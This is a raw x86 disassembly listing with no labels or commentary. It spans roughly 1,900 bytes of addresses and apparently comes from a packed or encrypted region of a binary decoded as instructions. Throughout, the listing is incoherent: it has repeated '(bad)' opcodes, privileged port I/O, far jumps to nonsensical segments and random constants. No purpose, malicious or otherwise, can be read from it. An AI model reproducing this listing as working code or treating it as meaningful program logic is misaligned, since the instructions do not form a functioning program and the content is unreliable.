  402fee:	mov    ah,0x11
  402ff0:	in     al,dx
  402ff1:	(bad)  
  402ff2:	retf   0x6392
  402ff5:	scas   al,BYTE PTR es:[edi]
  402ff6:	add    BYTE PTR [ecx],al
  402ff8:	in     eax,0x4d
  402ffa:	pop    ebp
  402ffb:	dec    edi
  402ffc:	sbb    DWORD PTR [esi-0x23995c0b],ebx
  403002:	push   ebp
  403003:	test   bl,dh
  403005:	int    0x4e
  403007:	jp     0x403063
  403009:	pop    ds
  40300a:	mov    bl,0x35
  40300c:	mov    esp,0xc65a9a24
  403011:	shl    DWORD PTR [ebp+0x52],0xd3
  403015:	les    ebx,FWORD PTR [edx]
  403017:	pop    edx
  403018:	adc    al,0x71
  40301a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40301c:	dec    eax
  40301d:	mov    ebx,0x6b54d431
  403022:	lahf   
  403023:	jmp    0x40305c
  403025:	push   cs
  403026:	pushf  
  403027:	es test eax,0x51f25a42
  40302d:	fadd   DWORD PTR [edi-0x77807b37]
  403033:	in     al,dx
  403034:	shl    bl,0x1
  403037:	fild   QWORD PTR [ebx-0x1d]
  40303a:	jbe    0x402fd5
  40303c:	fbstp  TBYTE PTR [esi+esi*2]
  40303f:	pop    ecx
  403040:	add    BYTE PTR [esi],bl
  403042:	cs ins BYTE PTR es:[edi],dx
  403044:	pop    ebx
  403045:	test   dl,ah
  403047:	outs   dx,BYTE PTR ds:[esi]
  403048:	fiadd  DWORD PTR [bp+di+0x627f]
  40304d:	xchg   bl,al
  40304f:	xor    BYTE PTR [edi+0x12],al
  403052:	jmp    0x3ab:0x16aee270
  403059:	arpl   WORD PTR [edi-0x6839890a],ax
  40305f:	xor    ch,BYTE PTR [edx]
  403061:	cli    
  403062:	sub    esp,ebp
  403064:	sahf   
  403065:	jne    0x4030a4
  403067:	sbb    eax,0xff327839
  40306c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40306d:	(bad)  
  40306e:	jecxz  0x403032
  403070:	leave  
  403071:	pop    eax
  403072:	fdiv   DWORD PTR [edi-0x80]
  403075:	jmp    0x403054
  403077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403078:	data16 and bh,BYTE PTR [ecx+0x586dcba4]
  40307f:	xchg   DWORD PTR [eax-0x19d3e71f],ebx
  403085:	push   edx
  403086:	fisub  DWORD PTR [ebx]
  403088:	pop    ds
  403089:	idiv   DWORD PTR [esi+0x12cb18ca]
  40308f:	mov    bl,0xff
  403091:	fsubr  DWORD PTR [edx+0x28edb78d]
  403097:	out    0xf1,eax
  403099:	loope  0x4030cb
  40309b:	in     al,dx
  40309c:	je     0x403032
  40309e:	push   ebx
  4030a0:	adc    al,0x20
  4030a2:	mov    BYTE PTR [ebx+0x1],ah
  4030a5:	xchg   ebx,eax
  4030a6:	outs   dx,BYTE PTR ds:[esi]
  4030a7:	aaa    
  4030a8:	xchg   esp,eax
  4030a9:	popf   
  4030aa:	scas   al,BYTE PTR es:[edi]
  4030ab:	lea    ebp,[ecx]
  4030ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ae:	push   edx
  4030af:	xchg   ecx,eax
  4030b0:	push   ds
  4030b1:	sub    dh,ah
  4030b3:	data16 int 0x26
  4030b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030b7:	jmp    0xb964:0xe79090df
  4030be:	dec    edi
  4030bf:	stc    
  4030c0:	les    ebx,FWORD PTR [ecx]
  4030c2:	jb     0x403083
  4030c4:	adc    ch,bl
  4030c6:	sub    bl,BYTE PTR [esi+0x6a]
  4030c9:	jb     0x403054
  4030cb:	dec    si
  4030cd:	add    DWORD PTR [ebp-0x5f],ecx
  4030d0:	sub    DWORD PTR [eax],edi
  4030d2:	dec    ebx
  4030d3:	fadd   QWORD PTR [ebx-0x62bda903]
  4030d9:	dec    ebx
  4030da:	xchg   esp,eax
  4030db:	stos   BYTE PTR es:[edi],al
  4030dc:	sbb    ebx,DWORD PTR ds:0x36e2b62b
  4030e2:	arpl   WORD PTR [edx],ax
  4030e4:	hlt    
  4030e5:	sub    BYTE PTR [esi-0x21],0x7c
  4030e9:	mov    bl,0x79
  4030eb:	xor    DWORD PTR [ebx-0x321c62ed],esp
  4030f1:	xor    ecx,DWORD PTR [edi-0x45]
  4030f4:	(bad)  
  4030f6:	dec    eax
  4030f7:	xor    al,0x54
  4030f9:	outs   dx,BYTE PTR ds:[esi]
  4030fa:	inc    eax
  4030fb:	leave  
  4030fc:	cmp    DWORD PTR [ebx+ebx*2],esi
  4030ff:	pushf  
  403100:	sbb    al,0x4e
  403102:	cdq    
  403103:	sub    eax,0xbb601514
  403108:	ss mov ch,0xf8
  40310b:	cmp    DWORD PTR [ebx+0x46],eax
  40310e:	fimul  DWORD PTR [edi+0x40ae18e4]
  403114:	jo     0x40316a
  403116:	sub    al,0xd4
  403118:	push   ds
  403119:	fimul  WORD PTR [edx]
  40311b:	imul   esi,DWORD PTR [edi-0x1f],0x14585591
  403122:	mov    cl,0xd1
  403124:	and    DWORD PTR ds:0x48403a6f,ebp
  40312a:	ret    
  40312b:	push   ebx
  40312c:	add    al,0xb2
  40312e:	and    eax,DWORD PTR [ebp+0x5aebe56b]
  403134:	push   cs
  403135:	lahf   
  403136:	push   esp
  403137:	mov    esi,0xab32ea18
  40313c:	sub    DWORD PTR [eax],ecx
  40313e:	sbb    BYTE PTR [ebp-0x16],cl
  403141:	lahf   
  403142:	or     ch,BYTE PTR [ebx-0x77]
  403145:	sub    ebp,edx
  403147:	mov    ah,0x9a
  403149:	cmp    BYTE PTR [eax],bl
  40314b:	inc    esp
  40314c:	mov    ebx,0x1dfe86a
  403151:	mov    BYTE PTR [eax+edi*2-0x1bb7e1b],ch
  403158:	loope  0x4030ef
  40315a:	es dec esi
  40315c:	xchg   ah,dl
  40315e:	(bad)  
  40315f:	sbb    al,0xd
  403161:	push   es
  403162:	add    bh,bh
  403164:	xor    ebp,ebx
  403166:	xor    dl,BYTE PTR [ebx-0x58]
  403169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40316a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40316b:	popa   
  40316c:	push   ebx
  40316d:	fnstcw WORD PTR [ecx-0xc]
  403170:	pop    es
  403171:	or     edi,DWORD PTR [eax]
  403173:	inc    ebx
  403174:	push   eax
  403175:	fwait
  403176:	mov    ebp,0x805677c6
  40317b:	cli    
  40317c:	dec    esi
  40317d:	adc    al,0xa6
  40317f:	loopne 0x403103
  403181:	imul   BYTE PTR [esp+edi*2+0xd]
  403185:	xchg   edi,eax
  403186:	push   ds
  403187:	sub    edi,DWORD PTR [eax]
  403189:	mov    dl,0x57
  40318b:	sub    DWORD PTR [ebp+0x21bb65ae],ebx
  403191:	hlt    
  403192:	push   eax
  403193:	sbb    esi,DWORD PTR [edx]
  403195:	mov    al,ds:0x66598118
  40319a:	fnstsw WORD PTR [ecx+eax*8+0x15]
  40319e:	cmp    eax,0x7bd0ebd2
  4031a3:	arpl   WORD PTR [esi+0x3cf092b8],sp
  4031a9:	pop    edi
  4031aa:	cmp    BYTE PTR [ebx+edi*1],bl
  4031ad:	in     al,dx
  4031ae:	lods   al,BYTE PTR ds:[esi]
  4031af:	sbb    bl,dh
  4031b1:	sahf   
  4031b2:	addr16 pop edx
  4031b4:	add    eax,0x8c45a0f3
  4031b9:	mov    al,ds:0xfd6c56ef
  4031be:	cs aad 0x5f
  4031c1:	push   ebp
  4031c2:	dec    ebx
  4031c3:	dec    edx
  4031c4:	adc    dh,BYTE PTR [edx-0x1d]
  4031c7:	cmp    eax,0x199542a4
  4031cc:	xchg   ebx,eax
  4031cd:	outs   dx,BYTE PTR ds:[esi]
  4031ce:	jnp    0x403222
  4031d0:	out    0x2f,eax
  4031d2:	test   DWORD PTR [edi],esi
  4031d4:	retf   0xf571
  4031d7:	icebp  
  4031d8:	pushf  
  4031d9:	xchg   edi,eax
  4031da:	pop    edx
  4031db:	fwait
  4031dc:	aaa    
  4031dd:	and    BYTE PTR [edx-0x2fe57fe7],ah
  4031e3:	inc    ebx
  4031e4:	js     0x403213
  4031e6:	jecxz  0x40321f
  4031e8:	int    0x43
  4031ea:	pusha  
  4031eb:	jnp    0x40325e
  4031ed:	(bad)  
  4031ee:	xchg   esp,eax
  4031ef:	adc    BYTE PTR [ebx-0x45],bl
  4031f2:	shl    BYTE PTR [esi+0x3e74def2],0x24
  4031f9:	add    eax,0x80dd6cb8
  4031fe:	ja     0x403214
  403200:	sub    BYTE PTR [esi-0x65],0x1b
  403204:	mov    eax,0x2e2e0d41
  403209:	test   DWORD PTR ds:0xfd24a6fe,ecx
  40320f:	adc    eax,0xeb8727fc
  403214:	jl     0x4031b2
  403216:	or     al,0xcd
  403218:	addr16 int 0x82
  40321b:	adc    al,0xb3
  40321d:	sar    BYTE PTR [edi],cl
  40321f:	push   ds
  403220:	sub    dh,BYTE PTR [ecx+0x6]
  403223:	xor    BYTE PTR [esi-0x77],0xc6
  403227:	mov    DWORD PTR [ebp+0x6026bf90],ecx
  40322d:	imul   edi,DWORD PTR [ecx-0x7b],0xffffffcd
  403231:	sahf   
  403232:	in     al,0x4
  403234:	adc    bl,BYTE PTR [esi]
  403236:	lods   al,BYTE PTR ds:[esi]
  403237:	inc    eax
  403238:	xchg   ecx,eax
  403239:	cmc    
  40323a:	fs push es
  40323c:	mov    dh,0x2e
  40323e:	shl    BYTE PTR [esi+edx*8-0x26b9d1f],cl
  403245:	mov    edi,0x84d6d720
  40324a:	test   al,0xfb
  40324c:	fwait
  40324d:	xchg   BYTE PTR [esi+0x4086d819],ah
  403253:	adc    BYTE PTR [edx],ah
  403255:	mov    ecx,0x31732690
  40325a:	std    
  40325b:	(bad)  
  40325c:	aas    
  40325d:	and    DWORD PTR ss:[edx],edi
  403260:	pop    esi
  403261:	adc    BYTE PTR [ebx-0x25b3f80e],ch
  403267:	jo     0x403213
  403269:	dec    edx
  40326a:	jmp    0x8664:0x7863f8e8
  403271:	and    DWORD PTR [edx+edx*1+0x5e64b55d],0x245e814a
  40327c:	sbb    dh,BYTE PTR [eax+0xe]
  40327f:	data16 sub al,dh
  403282:	mov    edx,0x9c1cc6f
  403287:	add    al,0xba
  403289:	pop    ebx
  40328a:	mov    BYTE PTR [ebx],cl
  40328c:	xor    BYTE PTR [ecx+eax*8+0x5e73bbd7],cl
  403293:	add    eax,0xc36e834f
  403298:	xlat   BYTE PTR ds:[ebx]
  403299:	repz mov bl,BYTE PTR [ebx]
  40329c:	mov    BYTE PTR [ebx],ah
  40329e:	rol    esp,cl
  4032a0:	dec    edx
  4032a1:	out    0xf,al
  4032a3:	add    edx,DWORD PTR [esi+edx*8]
  4032a6:	sbb    ebx,esp
  4032a8:	cdq    
  4032a9:	sbb    al,0xd0
  4032ab:	pop    edi
  4032ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ad:	mov    edi,0x889f603e
  4032b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b3:	dec    esp
  4032b4:	jbe    0x40330c
  4032b6:	mov    ah,0x78
  4032b8:	mov    ebx,0x1b072a87
  4032bd:	cmp    al,0xa0
  4032bf:	cmc    
  4032c0:	ja     0x4032bf
  4032c2:	xor    edi,DWORD PTR [esi]
  4032c4:	dec    ebp
  4032c5:	jmp    0x52c2fc77
  4032ca:	sub    BYTE PTR [esi],bl
  4032cc:	aad    0x9
  4032ce:	and    eax,0xb8a50c3
  4032d3:	stos   BYTE PTR es:[edi],al
  4032d4:	push   ecx
  4032d5:	in     al,0x57
  4032d7:	dec    ebx
  4032d8:	cmp    ah,BYTE PTR ds:0x308d6130
  4032de:	inc    eax
  4032df:	fwait
  4032e0:	dec    ecx
  4032e1:	repz inc ebp
  4032e3:	aad    0x62
  4032e5:	cmp    eax,0x36db56bd
  4032ea:	cmp    al,0xe5
  4032ec:	xchg   ebp,eax
  4032ed:	pop    edi
  4032ee:	inc    esp
  4032ef:	mov    dh,0x2c
  4032f1:	cmp    eax,0xfc2c2e12
  4032f6:	xor    eax,0x9b4bae14
  4032fb:	test   DWORD PTR ds:0x368166af,0x52cb5669
  403305:	shr    DWORD PTR [ecx],cl
  403307:	jge    0x403340
  403309:	mov    ebx,ebx
  40330b:	scas   al,BYTE PTR es:[edi]
  40330c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40330d:	mov    edi,0x333c2768
  403312:	cmp    DWORD PTR [esi-0x6756bafe],ebp
  403318:	test   al,0x26
  40331a:	or     DWORD PTR [edx],edx
  40331c:	mov    ebp,0x7012e83d
  403321:	(bad)
  403324:	(bad)  
  403325:	sbb    al,0x11
  403327:	inc    ebx
  403328:	idiv   BYTE PTR [esi-0x282b869a]
  40332e:	inc    eax
  40332f:	(bad)  
  403330:	sub    dh,BYTE PTR [edx]
  403332:	pop    esp
  403333:	inc    ebx
  403334:	jnp    0x4032c1
  403336:	popa   
  403337:	std    
  403338:	fwait
  403339:	(bad)  
  40333a:	arpl   WORD PTR ss:[ecx],bx
  40333d:	dec    eax
  40333e:	lods   eax,DWORD PTR ds:[esi]
  40333f:	fwait
  403340:	xor    al,0x8
  403342:	(bad)  
  403343:	pop    edi
  403344:	call   0x1f468851
  403349:	mov    edi,0x1a847dfd
  40334e:	inc    ecx
  40334f:	xor    ebp,DWORD PTR [esi+0x72]
  403352:	in     al,dx
  403353:	in     al,0xa6
  403355:	ins    BYTE PTR es:[edi],dx
  403356:	push   0xffffffb0
  403358:	arpl   WORD PTR [ebx-0x59879ce5],bp
  40335e:	xchg   edi,eax
  40335f:	xor    ebx,eax
  403361:	popa   
  403362:	mov    esi,0x1da29508
  403367:	ja     0x40333c
  403369:	push   eax
  40336a:	push   esi
  40336b:	cmp    BYTE PTR [ecx-0x2d45e243],0x6a
  403372:	(bad)  
  403373:	fbstp  TBYTE PTR [edx+0x545e881d]
  403379:	xchg   ebx,eax
  40337a:	cld    
  40337b:	inc    esi
  40337c:	xor    eax,0x6cea92a9
  403381:	cli    
  403382:	push   ebx
  403383:	inc    edx
  403384:	mov    ecx,0x96bd6a80
  403389:	clc    
  40338a:	scas   al,BYTE PTR es:[edi]
  40338b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338c:	fdiv   DWORD PTR [eax+0x77]
  40338f:	and    BYTE PTR [esi-0x74eb1408],al
  403395:	lods   eax,DWORD PTR ds:[esi]
  403396:	call   0x9abb57ef
  40339b:	mov    dl,0xcf
  40339d:	mov    eax,ds:0x686c4d69
  4033a2:	xchg   esi,eax
  4033a3:	add    edx,0xffffffee
  4033a6:	mov    eax,ds:0xbaec5f5c
  4033ab:	jp     0x40342a
  4033ad:	mov    ebx,0xa7fea933
  4033b2:	enter  0x622a,0x88
  4033b6:	sbb    BYTE PTR [ebx+0x192abfc8],0x78
  4033bd:	sbb    dl,BYTE PTR [ecx-0x13]
  4033c0:	(bad)  
  4033c1:	test   al,0x5f
  4033c3:	xchg   esi,eax
  4033c4:	loopne 0x403410
  4033c6:	icebp  
  4033c7:	sahf   
  4033c8:	aad    0xe1
  4033ca:	jne    0x4033ac
  4033cc:	xchg   edi,eax
  4033cd:	xchg   edx,eax
  4033ce:	xor    cl,BYTE PTR [esi-0x62]
  4033d1:	mov    gs,eax
  4033d3:	loope  0x4033d5
  4033d5:	mov    esp,0xfd89a3ac
  4033da:	ret    
  4033db:	mov    DWORD PTR [esi-0x19],esp
  4033de:	leave  
  4033df:	jmp    0x4033d5
  4033e1:	dec    ebx
  4033e2:	mov    cl,0xf6
  4033e4:	sar    BYTE PTR [esi+ecx*8],1
  4033e7:	icebp  
  4033e8:	fcmovnbe st,st(6)
  4033ea:	jg     0x403407
  4033ec:	es icebp 
  4033ee:	out    0xe,eax
  4033f0:	stos   DWORD PTR es:[edi],eax
  4033f1:	jmp    0x4033e9
  4033f3:	das    
  4033f4:	sub    BYTE PTR [ebx+0x4d],cl
  4033f7:	hlt    
  4033f8:	shr    DWORD PTR [ebx],1
  4033fa:	mov    ebx,0x4f568ee
  4033ff:	cmp    eax,0x5c3745d0
  403404:	jnp    0x403480
  403406:	test   edx,ebx
  403408:	dec    esp
  403409:	jbe    0x40343a
  40340b:	test   DWORD PTR [ebx],edx
  40340d:	cli    
  40340e:	or     eax,0xc54487d5
  403413:	xchg   DWORD PTR [ecx],esp
  403415:	fcmovbe st,st(4)
  403417:	std    
  403418:	div    cl
  40341a:	sub    DWORD PTR [ebx],0x51
  40341d:	add    eax,0xff5fe56b
  403422:	jp     0x4033e6
  403424:	inc    esp
  403425:	mov    edx,0x479dcc8e
  40342a:	adc    cl,al
  40342c:	(bad)  
  40342e:	xchg   DWORD PTR [esp+ecx*8-0x6],ebx
  403432:	cld    
  403433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403434:	cmp    ch,BYTE PTR [ebx]
  403436:	mov    esi,0xc0fb4c6e
  40343b:	mov    esp,0x953e1c4d
  403440:	mov    dh,0xdb
  403442:	imul   edi,DWORD PTR [ecx-0x51],0x67
  403446:	sub    bh,BYTE PTR [ecx+0x631aaca6]
  40344c:	and    al,ch
  40344e:	outs   dx,BYTE PTR ds:[esi]
  40344f:	stc    
  403450:	mov    cl,0xd1
  403452:	push   eax
  403453:	pop    eax
  403454:	xchg   esp,eax
  403455:	stc    
  403456:	cmp    al,0x4e
  403458:	add    bl,dl
  40345a:	sbb    bl,BYTE PTR [eax-0x11]
  40345d:	jo     0x40346c
  40345f:	xor    BYTE PTR [esi+0x3ff683ec],dl
  403465:	xor    ecx,DWORD PTR [ebp-0x687f1e5e]
  40346b:	push   0x2
  40346d:	sub    dl,BYTE PTR [edi]
  40346f:	loope  0x40346d
  403471:	jge    0x403432
  403473:	leave  
  403474:	aam    0x77
  403476:	dec    eax
  403477:	out    0xc9,al
  403479:	and    eax,0xe88f7a29
  40347e:	mov    dh,ch
  403480:	jo     0x403487
  403482:	jp     0x40349b
  403484:	out    0x9,al
  403486:	out    dx,al
  403487:	inc    ebx
  403488:	cmp    BYTE PTR [edx+0xea17b12],cl
  40348e:	sbb    eax,0x197bf596
  403493:	popa   
  403494:	fst    st(5)
  403496:	cmp    al,0x3b
  403498:	out    dx,eax
  403499:	in     al,0xd9
  40349b:	xchg   ebp,eax
  40349c:	mov    DWORD PTR ds:0x95999693,eax
  4034a2:	sub    dh,ch
  4034a4:	jmp    0xbe76:0xba43d5aa
  4034ab:	adc    eax,0x8df5e47a
  4034b0:	xchg   esp,eax
  4034b1:	into   
  4034b2:	xchg   BYTE PTR [eax-0x50d145ac],dl
  4034b8:	xor    DWORD PTR [ebx+0x1e2950df],eax
  4034be:	ins    BYTE PTR es:[edi],dx
  4034bf:	jmp    0x775c:0xae9fdef6
  4034c6:	cmp    al,0xef
  4034c8:	xchg   esp,eax
  4034c9:	mov    ds:0x7e1c1dae,eax
  4034ce:	or     eax,0x9ad6b29
  4034d3:	mov    ebx,0x2fea89f
  4034d8:	dec    esp
  4034d9:	xchg   ebp,eax
  4034da:	xor    DWORD PTR [ecx],0x1ed2e2f8
  4034e0:	test   BYTE PTR [edx+0x17fc7cc],0xa7
  4034e7:	dec    esi
  4034e8:	sar    DWORD PTR [edx+ebp*8-0x7],1
  4034ec:	sub    BYTE PTR [ecx+0x6c],0x38
  4034f0:	nop
  4034f1:	test   BYTE PTR [ebx-0x13],dl
  4034f4:	fstp   TBYTE PTR [eax+0x30]
  4034f7:	jnp    0x4034bf
  4034f9:	xchg   esi,eax
  4034fa:	fidivr WORD PTR [ecx-0x44d65ab4]
  403500:	rcr    BYTE PTR [eax+0x7],cl
  403503:	or     eax,0x364ba54d
  403508:	xchg   BYTE PTR [ecx],bh
  40350a:	dec    ebp
  40350b:	jmp    0x614216c7
  403510:	jo     0x4034d6
  403512:	xchg   esp,eax
  403513:	fs call 0x6396:0x84f57cea
  40351b:	fldenv [esi]
  40351d:	dec    ebx
  40351e:	ins    DWORD PTR es:[edi],dx
  40351f:	sar    al,cl
  403521:	outs   dx,BYTE PTR ds:[esi]
  403522:	xor    eax,0xb872d189
  403527:	push   esp
  403528:	mov    dh,0x7d
  40352a:	fcom   DWORD PTR [eax+0x63]
  40352d:	stos   BYTE PTR es:[edi],al
  40352e:	inc    edx
  40352f:	adc    al,0xc5
  403531:	or     BYTE PTR [edx+0x4b6bc438],bh
  403537:	add    eax,0xb6b81a8d
  40353c:	popa   
  40353d:	pushf  
  40353e:	dec    edi
  403540:	push   ebx
  403541:	ja     0x4034de
  403543:	out    0x31,al
  403545:	cwde   
  403546:	fucomi st,st(6)
  403548:	outs   dx,DWORD PTR ds:[esi]
  403549:	push   ebp
  40354a:	mov    eax,ds:0xf44e001f
  40354f:	mov    ecx,DWORD PTR [eax]
  403551:	pop    ebx
  403552:	pop    ebx
  403553:	dec    ebx
  403554:	dec    ecx
  403555:	rol    BYTE PTR [esi],0x97
  403558:	jo     0x4034e8
  40355a:	and    eax,0x503e7b94
  40355f:	mov    ds:0xf998cedc,al
  403564:	or     eax,0xf7c07292
  403569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40356a:	loop   0x4035eb
  40356c:	ds pop eax
  40356e:	popa   
  40356f:	stos   BYTE PTR es:[edi],al
  403570:	sub    al,0x77
  403572:	not    DWORD PTR [eax]
  403574:	shr    DWORD PTR [ebp+0x2d17ee28],1
  40357a:	in     eax,dx
  40357b:	jle    0x403579
  40357d:	and    al,BYTE PTR [edi-0x1a70e1c7]
  403583:	adc    edx,edi
  403585:	jb     0x403510
  403587:	adc    BYTE PTR [ebp+0x36],bl
  40358a:	arpl   WORD PTR [edx-0x32de0a73],cx
  403590:	(bad)  
  403591:	jecxz  0x4035d7
  403593:	sbb    edx,DWORD PTR [edi+0x84f51b7]
  403599:	stos   DWORD PTR es:[edi],eax
  40359a:	mov    ebp,DWORD PTR [esi]
  40359c:	pop    edi
  40359d:	addr16 out dx,al
  40359f:	mov    ecx,0x8d7337c4
  4035a4:	das    
  4035a5:	sub    edx,eax
  4035a7:	clc    
  4035a8:	and    esp,DWORD PTR [ecx]
  4035aa:	(bad)  
  4035ac:	jp     0x40360e
  4035ae:	inc    esi
  4035af:	ja     0x4035db
  4035b1:	cld    
  4035b2:	loope  0x403599
  4035b4:	fidiv  WORD PTR [edi+ebx*1+0x4]
  4035b8:	lea    edi,[ecx-0x3e]
  4035bb:	lea    esi,[ebp-0xa]
  4035be:	fwait
  4035bf:	fwait
  4035c0:	mov    esp,0x1a5a9f64
  4035c5:	add    BYTE PTR [ebx-0x7b],bl
  4035c8:	loopne 0x403579
  4035ca:	xor    BYTE PTR [eax+0x44a68394],al
  4035d0:	mul    DWORD PTR [ebx]
  4035d2:	frstor [ebp+0x56]
  4035d5:	ret    
  4035d6:	add    edx,edx
  4035d8:	ss xor al,0x73
  4035db:	test   ch,cl
  4035dd:	bound  edi,QWORD PTR [edi]
  4035df:	mov    al,0x3e
  4035e1:	jle    0x40363e
  4035e3:	dec    edx
  4035e4:	cmp    al,0xc9
  4035e6:	sub    al,dl
  4035e8:	jo     0x403572
  4035ea:	icebp  
  4035eb:	ret    0x68d4
  4035ee:	inc    ebx
  4035ef:	pop    esp
  4035f0:	mov    ds:0x224d3be3,al
  4035f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035f6:	stos   BYTE PTR es:[edi],al
  4035f7:	loope  0x4035b7
  4035f9:	aad    0x7a
  4035fb:	mov    dl,0x1c
  4035fd:	add    eax,0xc918581d
  403602:	(bad)  
  403603:	pushf  
  403604:	xor    al,0x8a
  403606:	pop    ebx
  403607:	aam    0x5b
  403609:	imul   eax,DWORD PTR [ecx-0x52fbfbd2],0x652eb083
  403613:	test   DWORD PTR [esi-0xc],ecx
  403616:	sti    
  403617:	aad    0x82
  403619:	mov    ebp,0x48b51a69
  40361e:	add    al,0xb7
  403620:	mov    cl,0x59
  403622:	enter  0xfde1,0xa
  403626:	pop    ecx
  403627:	cmp    dl,BYTE PTR [edx]
  403629:	or     BYTE PTR [eax-0x410abf4d],al
  40362f:	or     DWORD PTR [esi-0x26],ecx
  403632:	mov    fs,WORD PTR [ebp+0x37]
  403635:	fstp   QWORD PTR [edi+edx*4+0x6ce2f3b3]
  40363c:	xchg   edx,eax
  40363d:	popf   
  40363e:	repz xchg esp,eax
  403640:	pop    ss
  403641:	out    dx,eax
  403642:	fnstcw WORD PTR ds:0x401730de
  403648:	std    
  403649:	sub    al,0x23
  40364b:	mov    ds:0xc8ef1949,al
  403650:	imul   esp,DWORD PTR [edi-0x6],0x39
  403654:	adc    al,0xf9
  403656:	call   0x3e47:0x52bde896
  40365d:	or     ebx,DWORD PTR [edi-0x2]
  403660:	mov    DWORD PTR [esp+ecx*1+0x1dfa42bf],edx
  403667:	iret   
  403668:	xchg   edx,eax
  403669:	nop
  40366a:	out    dx,al
  40366b:	paddd  mm5,QWORD PTR [edi-0x60]
  40366f:	in     al,0xdb
  403671:	dec    BYTE PTR [eax+0x5f]
  403674:	aaa    
  403675:	jp     0x40366f
  403677:	sti    
  403678:	fs push ds
  40367a:	mov    al,ds:0x63431a60
  40367f:	inc    ebx
  403680:	pop    esp
  403681:	xchg   ebx,eax
  403682:	mov    ebp,0x9e116bc5
  403687:	jp     0x403659
  403689:	xchg   ebp,eax
  40368a:	jmp    0x86d5739f
  40368f:	jnp    0x4036b3
  403691:	repz and bl,bh
  403694:	mov    WORD PTR [ebx+0x1bb3c6eb],ss
  40369a:	call   0x4039c9ee
  40369f:	adc    bl,ah
  4036a1:	sbb    BYTE PTR [eax+0x4d],ch
  4036a4:	aam    0x5b
  4036a6:	and    ebx,0x22afc017
  4036ac:	jmp    0xb6de:0xf53527e1
  4036b3:	cmp    BYTE PTR [ecx+0x11a74f24],ah
  4036b9:	dec    eax
  4036ba:	imul   edi,DWORD PTR [edi-0x3a77df3b],0x62
  4036c1:	or     al,0x61
  4036c3:	jo     0x403665
  4036c5:	push   ebx
  4036c6:	lock lahf 
  4036c8:	jmp    0x4036b5
  4036ca:	ja     0x403702
  4036cc:	jbe    0x4036a5
  4036ce:	jb     0x40370a
  4036d0:	jmp    0x68ae11bf
  4036d5:	lds    eax,FWORD PTR [ebx-0x7a]
  4036d8:	adc    ebp,DWORD PTR [edi+0x28]
  4036db:	outs   dx,DWORD PTR ds:[esi]
  4036dc:	or     al,0x52
  4036de:	addr16 jg 0x403706
  4036e1:	loope  0x40366e
  4036e3:	aad    0xae
  4036e5:	arpl   bx,bx
  4036e7:	dec    ecx
  4036e8:	jb     0x40373f
  4036ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036eb:	jmp    0x40375e
  4036ed:	cli    
  4036ee:	das    
  4036ef:	mov    BYTE PTR [ebx],dh
  4036f1:	sar    DWORD PTR [edx+0x6c],1
  4036f4:	popf   
  4036f5:	bound  ebx,QWORD PTR [ebx-0x78]
  4036f8:	sbb    edi,DWORD PTR [eax]
  4036fa:	cli    
  4036fb:	in     al,dx
  4036fc:	data16 xchg dh,dl
  4036ff:	cmc    
  403700:	fbld   TBYTE PTR [edx+0x287769ee]
  403706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403707:	xor    esp,ecx
  403709:	test   BYTE PTR [edi-0x73],dl
  40370c:	ja     0x40371e
  40370e:	xchg   edi,eax
  40370f:	cmp    ebx,esp
  403711:	bound  eax,QWORD PTR [ebp-0x1d]
  403714:	fbld   TBYTE PTR [edx+ecx*2+0x48f3463c]
  40371b:	repz je 0x403753
  40371e:	(bad)  
  403720:	inc    esp
  403721:	fldcw  WORD PTR [esi-0x47a90292]
  403727:	fcmovu st,st(7)
  403729:	jnp    0x403797
  40372b:	mov    DWORD PTR [edx+eax*1-0x4386f871],ebx
  403732:	sub    edx,ebp
  403734:	addr16 das 
  403736:	adc    edx,ebp
  403738:	aam    0xf9
  40373a:	je     0x403778
  40373c:	neg    DWORD PTR [edi+eax*4]
  40373f:	fistp  DWORD PTR [edi+ecx*8]
  403742:	enter  0x4836,0x3b
  403746:	mov    ecx,0x16e20502
  40374b:	sbb    eax,0xd24d76d1
  403750:	add    al,0x85
  403752:	inc    esi
  403753:	mov    esp,0xb2dc430c
  403758:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40375a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40375b:	in     eax,0xff
  40375d:	jecxz  0x4036f0
  40375f:	pop    ebx
  403760:	or     ah,bh
  403762:	cmp    BYTE PTR [edi+0x3472d3ff],cl
  403768:	lods   al,BYTE PTR ds:[esi]
  403769:	mov    ecx,0x3ff5001a
  40376e:	scas   al,BYTE PTR es:[edi]
  40376f:	test   DWORD PTR [ebx-0x79],0x1058b082
  403776:	inc    edx
  403777:	pushf  
  403778:	js     0x4037b7
  40377a:	in     al,dx
  40377b:	mov    edi,0x7d23dc70
  403780:	ins    BYTE PTR es:[edi],dx
  403781:	icebp  
  403782:	xchg   ecx,eax
  403783:	pop    ecx
  403784:	or     BYTE PTR [eax+eax*4+0x7b],ch
  403788:	xor    DWORD PTR [edi],edi
  40378a:	mov    edx,0x9241900
  40378f:	sbb    al,0xba
  403791:	sub    BYTE PTR ds:0xd70aea03,al
  403797:	xchg   DWORD PTR [ebp+0x4edc0c5d],ebp
  40379d:	ss out dx,eax
  40379f:	push   ebp
  4037a0:	and    ebp,DWORD PTR [ecx]
  4037a2:	(bad)  
  4037a3:	jl     0x403805
  4037a5:	(bad)  
  4037a7:	and    al,0xb3
  4037a9:	jmp    0x371cb371
  4037ae:	popa   
  4037af:	je     0x40377a
  4037b1:	mov    dh,0xc3
  4037b3:	add    dh,0xb4
  4037b6:	xchg   ebx,eax
